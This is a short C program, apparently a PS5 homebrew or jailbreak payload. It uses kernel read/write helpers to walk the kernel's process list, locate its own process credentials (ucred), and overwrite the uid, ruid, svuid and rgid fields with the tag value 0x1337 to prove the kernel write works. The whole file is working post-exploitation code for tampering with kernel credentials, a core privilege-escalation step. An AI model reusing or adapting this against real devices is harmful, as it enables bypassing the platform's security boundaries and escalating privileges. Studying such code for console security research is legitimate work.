#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ps5/kernel.h>


int main() {
  uint64_t allproc_addr = KERNEL_ADDRESS_DATA_BASE + KERNEL_OFFSET_ALLPROC;
  uint64_t cur_proc_ucred_addr = 0;
  uint64_t next_proc_addr = 0;
  uint64_t cur_proc_addr = 0;
  uint32_t cur_proc_pid = 0;
  pid_t pid = getpid();

  printf("[+] kernel .data base is 0x%llx\n", KERNEL_ADDRESS_DATA_BASE);
  printf("[+] PID = 0x%x\n", pid);
  printf("[+] UID = 0x%x\n", getuid());

  kernel_copyout(allproc_addr, &cur_proc_addr, sizeof(cur_proc_addr));
  for (;;) {
    // Get next proc
    kernel_copyout(cur_proc_addr, &next_proc_addr, sizeof(next_proc_addr));

    // Check PID
    kernel_copyout(cur_proc_addr + KERNEL_OFFSET_PROC_P_PID, &cur_proc_pid,
		   sizeof(cur_proc_pid));
    if (cur_proc_pid == pid) {
      // Get ucred
      kernel_copyout(cur_proc_addr + KERNEL_OFFSET_PROC_P_UCRED,
		     &cur_proc_ucred_addr, sizeof(cur_proc_ucred_addr));
      break;
    }

    if (next_proc_addr == 0)
      break;

    // Move to next proc
    cur_proc_addr = next_proc_addr;
  }

  // If we failed to find ucred, go no further - avoid panic for no reason
  if (cur_proc_ucred_addr == 0) {
    printf("[!] failed to find ucred :(\n");
    return EXIT_FAILURE;
  }

  printf("[+] ucred = 0x%llx\n", cur_proc_ucred_addr);

  // Patch creds to be a tagged uid so we know write works
  uint32_t tagged_uid = 0x1337;

  kernel_copyin(&tagged_uid, cur_proc_ucred_addr + KERNEL_OFFSET_UCRED_CR_UID,
		sizeof(tagged_uid));
  kernel_copyin(&tagged_uid, cur_proc_ucred_addr + KERNEL_OFFSET_UCRED_CR_RUID,
		sizeof(tagged_uid));
  kernel_copyin(&tagged_uid, cur_proc_ucred_addr + KERNEL_OFFSET_UCRED_CR_SVUID,
		sizeof(tagged_uid));
  kernel_copyin(&tagged_uid, cur_proc_ucred_addr + KERNEL_OFFSET_UCRED_CR_RGID,
		sizeof(tagged_uid));

  printf("[+] UID = 0x%x\n", getuid());

  return EXIT_SUCCESS;
}
